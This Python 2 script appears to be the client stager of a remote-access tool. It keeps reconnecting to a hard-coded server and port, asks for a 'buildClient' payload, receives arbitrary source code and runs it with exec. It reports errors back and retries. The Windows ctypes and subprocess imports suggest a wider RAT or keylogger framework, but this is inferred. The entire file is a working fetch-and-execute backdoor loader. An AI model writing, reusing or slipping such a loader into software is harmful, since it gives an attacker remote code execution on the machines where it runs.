# -*- coding: utf-8 -*-
# !/usr/bin/python

import socket
import time
import ast
import sys
import os
import platform
import ctypes
from ctypes.wintypes import MSG
import threading
import subprocess
import sched
import datetime
import zlib

HOST = '127.0.0.1'
PORT = 4434
ACTIVE = False
GLOBAL_SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

while 1:
    try:
        GLOBAL_SOCKET.connect((HOST, PORT))
        GLOBAL_SOCKET.recv(1024)
        GLOBAL_SOCKET.sendall(str({'mode': 'buildClient', 'from': 'client', 'payload': '', 'key': '', 'session_id': ''})+'[ENDOFMESSAGE]')
        received_data = ''
        payload = GLOBAL_SOCKET.recv(1024)
        while payload:
            received_data = received_data + payload
            if received_data.endswith('[ENDOFSOURCE]'):
                received_data = received_data[:-len('[ENDOFSOURCE]')]
                break
            else:
                payload = GLOBAL_SOCKET.recv(1024)
                continue
        try:
            ACTIVE = True
            exec received_data
        except Exception as e:
            GLOBAL_SOCKET.sendall(str({'mode': 'buildClientError', 'from': 'client', 'payload': '%s' % e, 'key': '', 'session_id': ''})+'[ENDOFMESSAGE]')
            ACTIVE = False
            time.sleep(60)
    except socket.error:
        time.sleep(5)